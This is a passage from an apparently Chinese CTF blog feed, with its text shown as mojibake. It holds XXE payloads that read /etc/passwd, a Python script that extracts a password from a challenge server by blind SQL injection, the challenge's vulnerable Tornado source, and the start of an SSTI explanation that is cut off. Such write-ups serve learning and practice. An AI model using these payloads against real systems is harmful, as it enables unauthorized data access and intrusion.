class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY b <span class="hljs-meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><span class="hljs-symbol">&amp;b;</span><span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>é€šè¿‡DTDyå¼•å…¥å¤–éƒ¨DTDå†å¼•å…¥å¤–éƒ¨å®ä½“å£°æ˜</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><span class="hljs-symbol">&amp;b;</span><span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>DTDæ–‡ä»¶å†…å®¹ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY b <span class="hljs-meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>ä¸åŒç¨‹åºæ”¯æŒçš„åè®®ä¸åŒ</p><p><img src="https://img-blog.csdnimg.cn/img_convert/d408adb6e9e833ca14fb08b299914c16.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>QWBæ‰˜çº³å¤š</title>
    <link href="/2021/07/16/2021-7-16-QWB%E6%89%98%E7%BA%B3%E5%A4%9A/"/>
    <url>/2021/07/16/2021-7-16-QWB%E6%89%98%E7%BA%B3%E5%A4%9A/</url>
    
    <content type="html"><![CDATA[<h2 id="QWBæ‰˜çº³å¤š"><a href="#QWBæ‰˜çº³å¤š" class="headerlink" title="QWBæ‰˜çº³å¤š"></a>QWBæ‰˜çº³å¤š</h2><p>æ³¨å†Œé¡µé¢å­˜åœ¨æ³¨å…¥ï¼Œåˆ©ç”¨processlistè¡¨è¯»å–æ­£åœ¨æ‰§è¡Œçš„sqlè¯­å¥ï¼Œä»è€Œå¾—åˆ°è¡¨åä¸åˆ—åã€‚</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> string<br><span class="hljs-comment"># string = string.ascii_letters + string.digits</span><br><span class="hljs-comment"># print(string)</span><br>payload = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">300</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">31</span>,<span class="hljs-number">130</span>):<br>        <span class="hljs-comment"># payload = url  + &quot;username=&quot; + &quot;&#x27; or if(ascii(substr(select FILE_NAME FROM performance_schema.file_instances limit 150,1))&gt;&quot;</span><br>        url = <span class="hljs-string">&quot;http://5af86460-e42f-4f41-9eb0-b2ce7064ae5d.node4.buuoj.cn/register.php?username=&#x27; or  if((ascii(substr((select INFO  FROM information_schema.processlist limit 0,1),&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;,1)) in (&quot;</span>+<span class="hljs-built_in">str</span>(j)+<span class="hljs-string">&quot;)),1,0) or &#x27;0&amp;password=12&quot;</span><br>        <span class="hljs-comment"># print(url)</span><br>        <span class="hljs-comment"># s = requests.session()</span><br>        <span class="hljs-comment"># print(url)</span><br>        r = requests.get(url)<br>        time.sleep(<span class="hljs-number">0.5</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;this username&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>            payload += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(payload)<br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">break</span><br></code></pre></div></td></tr></table></figure><p>è·‘å‡ºæ¥æ˜¯<code>SELECT qwbqwbqwbuser,qwbqwbqwbpass from qwbtttaaab111e where  qwbqwbqwbuser=&#39;&#39; or  if((ascii(substr((select INFO  FROM information_schema.processlist limit 0,1),1åé¢å°±æ˜¯payloadï¼Œçœç•¥</code></p><p>å¯ä»¥çœ‹åˆ°è¡¨ä¸º<code>qwbtttaaab111e</code>ï¼Œå­—æ®µä¸º<code>qwbqwbqwbuser,qwbqwbqwbpass</code></p><p>åˆ™payloadä¸º<code>username=&#39; or  if((ascii(substr((select qwbqwbqwbpass FROM qwbtttaaab111e limit 0,1),&quot;+str(i)+&quot;,1)) in (&quot;+str(j)+&quot;)),1,0) or &#39;0&amp;password=12&quot;</code></p><p>å¾—åˆ°å¯†ç ï¼Œglzjin666888</p><p><img src="https://img-blog.csdnimg.cn/20210717211514175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä½†æ˜¯buuä¸Šå¥½åƒæ— æ³•ç™»å½•ä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚ç›´æ¥æ‰¾åˆ°æºç å®¡è®¡å§</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> tornado.ioloop, tornado.web, tornado.options, pymysql, os, re<br>settings = &#123;<span class="hljs-string">&#x27;static_path&#x27;</span>: os.path.join(os.getcwd(), <span class="hljs-string">&#x27;static&#x27;</span>),<br> <span class="hljs-string">&#x27;cookie_secret&#x27;</span>: <span class="hljs-string">&#x27;b93a9960-bfc0-11eb-b600-002b677144e0&#x27;</span>&#125;<br>db_username = <span class="hljs-string">&#x27;root&#x27;</span><br>db_password = <span class="hljs-string">&#x27;xxxx&#x27;</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainHandler</span>(<span class="hljs-params">tornado.web.RequestHandler</span>):</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self</span>):</span><br>        user = self.get_secure_cookie(<span class="hljs-string">&#x27;user&#x27;</span>)<br>        <span class="hljs-keyword">if</span> user <span class="hljs-keyword">and</span> user == <span class="hljs-string">b&#x27;admin&#x27;</span>:<br>            self.redirect(<span class="hljs-string">&#x27;/admin.php&#x27;</span>, permanent=<span class="hljs-literal">True</span>)<br>            <span class="hljs-keyword">return</span><br>        self.render(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginHandler</span>(<span class="hljs-params">tornado.web.RequestHandler</span>):</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self</span>):</span><br>        username = self.get_argument(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        password = self.get_argument(<span class="hljs-string">&#x27;password&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> username <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> password:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.get_secure_cookie(<span class="hljs-string">&#x27;user&#x27;</span>):<br>                self.finish(<span class="hljs-string">&#x27;&lt;script&gt;alert(`please input your password and username`);history.go(-1);&lt;/script&gt;&#x27;</span>)<br>                <span class="hljs-keyword">return</span><br>            <span class="hljs-keyword">if</span> self.get_secure_cookie(<span class="hljs-string">&#x27;user&#x27;</span>) == <span class="hljs-string">b&#x27;admin&#x27;</span>:<br>                self.redirect(<span class="hljs-string">&#x27;/admin.php&#x27;</span>, permanent=<span class="hljs-literal">True</span>)<br>            <span class="hljs-keyword">else</span>:<br>                self.redirect(<span class="hljs-string">&#x27;/&#x27;</span>, permanent=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">else</span>:<br>            conn = pymysql.connect(<span class="hljs-string">&#x27;localhost&#x27;</span>, db_username, db_password, <span class="hljs-string">&#x27;qwb&#x27;</span>)<br>            cursor = conn.cursor()<br>            cursor.execute(<span class="hljs-string">&#x27;SELECT * from qwbtttaaab111e where qwbqwbqwbuser=%s and qwbqwbqwbpass=%s&#x27;</span>, [username, password])<br>            results = cursor.fetchall()<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(results) != <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">if</span> results[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;admin&#x27;</span>:<br>                    self.set_secure_cookie(<span class="hljs-string">&#x27;user&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>)<br>                    cursor.close()<br>                    conn.commit()<br>                    conn.close()<br>                    self.redirect(<span class="hljs-string">&#x27;/admin.php&#x27;</span>, permanent=<span class="hljs-literal">True</span>)<br>                    <span class="hljs-keyword">return</span><br>                <span class="hljs-keyword">else</span>:<br>                    cursor.close()<br>                    conn.commit()<br>                    conn.close()<br>                    self.finish(<span class="hljs-string">&#x27;&lt;script&gt;alert(`login success, but only admin can get flag`);history.go(-1);&lt;/script&gt;&#x27;</span>)<br>                    <span class="hljs-keyword">return</span><br>            <span class="hljs-keyword">else</span>:<br>                cursor.close()<br>                conn.commit()<br>                conn.close()<br>                self.finish(<span class="hljs-string">&#x27;&lt;script&gt;alert(`your username or password is error`);history.go(-1);&lt;/script&gt;&#x27;</span>)<br>                <span class="hljs-keyword">return</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RegisterHandler</span>(<span class="hljs-params">tornado.web.RequestHandler</span>):</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self</span>):</span><br>        username = self.get_argument(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        password = self.get_argument(<span class="hljs-string">&#x27;password&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        word_bans = [<span class="hljs-string">&#x27;table&#x27;</span>, <span class="hljs-string">&#x27;col&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;union&#x27;</span>, <span class="hljs-string">&#x27;inno&#x27;</span>, <span class="hljs-string">&#x27;like&#x27;</span>, <span class="hljs-string">&#x27;regexp&#x27;</span>]<br>        bans = [<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;%&#x27;</span>, <span class="hljs-string">&#x27;&amp;&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;&lt;&#x27;</span>, <span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;^&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;--&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>]<br>        <span class="hljs-keyword">for</span> ban <span class="hljs-keyword">in</span> word_bans:<br>            <span class="hljs-keyword">if</span> re.search(ban, username, re.IGNORECASE):<br>                self.finish(<span class="hljs-string">&#x27;&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;&#x27;</span>)<br>                <span class="hljs-keyword">return</span><br><br>        <span class="hljs-keyword">for</span> ban <span class="hljs-keyword">in</span> bans:<br>            <span class="hljs-keyword">if</span> ban <span class="hljs-keyword">in</span> username:<br>                self.finish(<span class="hljs-string">&#x27;&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;&#x27;</span>)<br>                <span class="hljs-keyword">return</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> username <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> password:<br>            self.render(<span class="hljs-string">&#x27;register.html&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">if</span> username == <span class="hljs-string">&#x27;admin&#x27;</span>:<br>            self.render(<span class="hljs-string">&#x27;register.html&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br>        conn = pymysql.connect(<span class="hljs-string">&#x27;localhost&#x27;</span>, db_username, db_password, <span class="hljs-string">&#x27;qwb&#x27;</span>)<br>        cursor = conn.cursor()<br>        <span class="hljs-keyword">try</span>:<br>            cursor.execute(<span class="hljs-string">&quot;SELECT qwbqwbqwbuser,qwbqwbqwbpass from qwbtttaaab111e where qwbqwbqwbuser=&#x27;%s&#x27;&quot;</span> % username)<br>            results = cursor.fetchall()<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(results) != <span class="hljs-number">0</span>:<br>                self.finish(<span class="hljs-string">&#x27;&lt;script&gt;alert(`this username had been used`);history.go(-1);&lt;/script&gt;&#x27;</span>)<br>                conn.commit()<br>                conn.close()<br>                <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">except</span>:<br>            conn.commit()<br>            conn.close()<br>            self.finish(<span class="hljs-string">&#x27;&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br><br>        <span class="hljs-keyword">try</span>:<br>            cursor.execute(<span class="hljs-string">&#x27;insert into qwbtttaaab111e (qwbqwbqwbuser, qwbqwbqwbpass) values(%s, %s)&#x27;</span>, [username, password])<br>            conn.commit()<br>            conn.close()<br>            self.finish(<span class="hljs-string">&quot;&lt;script&gt;alert(`success`);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>)<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">except</span>:<br>            conn.rollback()<br>            conn.close()<br>            self.finish(<span class="hljs-string">&#x27;&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LogoutHandler</span>(<span class="hljs-params">tornado.web.RequestHandler</span>):</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self</span>):</span><br>        self.clear_all_cookies()<br>        self.redirect(<span class="hljs-string">&#x27;/&#x27;</span>, permanent=<span class="hljs-literal">True</span>)<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AdminHandler</span>(<span class="hljs-params">tornado.web.RequestHandler</span>):</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self</span>):</span><br>        user = self.get_secure_cookie(<span class="hljs-string">&#x27;user&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user <span class="hljs-keyword">or</span> user != <span class="hljs-string">b&#x27;admin&#x27;</span>:<br>            self.redirect(<span class="hljs-string">&#x27;/index.php&#x27;</span>, permanent=<span class="hljs-literal">True</span>)<br>            <span class="hljs-keyword">return</span><br>        self.render(<span class="hljs-string">&#x27;admin.html&#x27;</span>)<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ImageHandler</span>(<span class="hljs-params">tornado.web.RequestHandler</span>):</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self</span>):</span><br>        user = self.get_secure_cookie(<span class="hljs-string">&#x27;user&#x27;</span>)<br>        image_name = self.get_argument(<span class="hljs-string">&#x27;qwb_image_name&#x27;</span>, <span class="hljs-string">&#x27;header.jpeg&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> image_name:<br>            self.redirect(<span class="hljs-string">&#x27;/&#x27;</span>, permanent=<span class="hljs-literal">True</span>)<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user <span class="hljs-keyword">or</span> user != <span class="hljs-string">b&#x27;admin&#x27;</span>:<br>                self.redirect(<span class="hljs-string">&#x27;/&#x27;</span>, permanent=<span class="hljs-literal">True</span>)<br>                <span class="hljs-keyword">return</span><br>            <span class="hljs-keyword">if</span> image_name.endswith(<span class="hljs-string">&#x27;.py&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> image_name <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;..&#x27;</span> <span class="hljs-keyword">in</span> image_name:<br>                self.finish(<span class="hljs-string">&quot;nonono, you can&#x27;t read it.&quot;</span>)<br>                <span class="hljs-keyword">return</span><br>            image_name = os.path.join(os.getcwd() + <span class="hljs-string">&#x27;/image&#x27;</span>, image_name)<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(image_name, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> (f):<br>                img = f.read()<br>            self.set_header(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;image/jpeg&#x27;</span>)<br>            self.finish(img)<br>            <span class="hljs-keyword">return</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SecretHandler</span>(<span class="hljs-params">tornado.web.RequestHandler</span>):</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(tornado.web.RequestHandler._template_loaders):<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tornado.web.RequestHandler._template_loaders:<br>                tornado.web.RequestHandler._template_loaders[i].reset()<br><br>        msg = self.get_argument(<span class="hljs-string">&#x27;congratulations&#x27;</span>, <span class="hljs-string">&#x27;oh! you find it&#x27;</span>)<br>        bans = []<br>        <span class="hljs-keyword">for</span> ban <span class="hljs-keyword">in</span> bans:<br>            <span class="hljs-keyword">if</span> ban <span class="hljs-keyword">in</span> msg:<br>                self.finish(<span class="hljs-string">&#x27;bad hack,go out!&#x27;</span>)<br>                <span class="hljs-keyword">return</span><br><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;congratulations.html&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> (f):<br>            f.write(<span class="hljs-string">&#x27;&lt;html&gt;&lt;head&gt;&lt;title&gt;congratulations&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;%s&quot;);location.href=\&#x27;/admin.php\&#x27;;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n&#x27;</span> % msg)<br>            f.flush()<br>        self.render(<span class="hljs-string">&#x27;congratulations.html&#x27;</span>)<br>        <span class="hljs-keyword">if</span> tornado.web.RequestHandler._template_loaders:<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tornado.web.RequestHandler._template_loaders:<br>                tornado.web.RequestHandler._template_loaders[i].reset()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">make_app</span>():</span><br>    <span class="hljs-keyword">return</span> tornado.web.Application([<br>     (<br>      <span class="hljs-string">&#x27;/index.php&#x27;</span>, MainHandler),<br>     (<br>      <span class="hljs-string">&#x27;/login.php&#x27;</span>, LoginHandler),<br>     (<br>      <span class="hljs-string">&#x27;/logout.php&#x27;</span>, LogoutHandler),<br>     (<br>      <span class="hljs-string">&#x27;/register.php&#x27;</span>, RegisterHandler),<br>     (<br>      <span class="hljs-string">&#x27;/admin.php&#x27;</span>, AdminHandler),<br>     (<br>      <span class="hljs-string">&#x27;/qwbimage.php&#x27;</span>, ImageHandler),<br>     (<br>      <span class="hljs-string">&#x27;/good_job_my_ctfer.php&#x27;</span>, SecretHandler),<br>     (<br>      <span class="hljs-string">&#x27;/&#x27;</span>, MainHandler)], **settings)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app = make_app()<br>    app.listen(<span class="hljs-number">8000</span>)<br>    tornado.ioloop.IOLoop.current().start()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;start&#x27;</span>)<br></code></pre></div></td></tr></table></figure><p>å…·ä½“æ¼æ´å‡ºç°åœ¨</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">msg = self.get_argument(<span class="hljs-string">&#x27;congratulations&#x27;</span>, <span class="hljs-string">&#x27;oh! you find it&#x27;</span>)<br>        bans = []<br>        <span class="hljs-keyword">for</span> ban <span class="hljs-keyword">in</span> bans:<br>            <span class="hljs-keyword">if</span> ban <span class="hljs-keyword">in</span> msg:<br>                self.finish(<span class="hljs-string">&#x27;bad hack,go out!&#x27;</span>)<br>                <span class="hljs-keyword">return</span><br><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;congratulations.html&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> (f):<br>            f.write(<span class="hljs-string">&#x27;&lt;html&gt;&lt;head&gt;&lt;title&gt;congratulations&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;%s&quot;);location.href=\&#x27;/admin.php\&#x27;;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n&#x27;</span> % msg)<br>            f.flush()<br></code></pre></div></td></tr></table></figure><p>æ¥å—äº†ä¸€ä¸ª<code>congratulations</code>å‚æ•°ï¼Œæ˜æ˜¾çš„æ˜¯SSTIæ¨¡æ¿æ³¨å…¥</p><p>å¾—åˆ°æºç å,è¿‡æ»¤äº†<code>&#123;&#123;&#125;&#125;</code>æ ‡ç­¾ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ç”¨çš„åªæœ‰<code>&#123;%%&#125;</code>æ ‡ç­¾ï¼Œè€Œå‰©ä¸‹çš„æ“ä½œåä¸­ï¼Œæœ‰ä¸€ä¸ªæ“ä½œæ˜¯æ¯”è¾ƒå±é™©çš„ï¼Œé‚£å°±æ˜¯extendsæ“ä½œï¼Œå®ƒçš„å‚æ•°ä¸ºä¸€ä¸ªæ–‡ä»¶åï¼Œè¯¥æ–‡ä»¶å°†ä¼šè¢«ä½œä¸ºæ¨¡æ¿æ–‡ä»¶è¢«åŒ…å«ï¼Œå¹¶è¢«æ¸²æŸ“ã€‚é‚£ä¹ˆå¦‚æœæˆ‘ä»¬åŒ…å«ä¸€ä¸ªå¸¦æœ‰æ¶æ„SSTIçš„payloadçš„å­—ç¬¦ä¸²çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆæ˜¯å¯ä»¥æ‰§è¡Œè¯¥SSTIçš„payloadçš„ã€‚å› æ­¤æˆ‘ä»¬ç°åœ¨éœ€è¦å¾€æœåŠ¡å™¨ä¸Šä¸Šä¼ 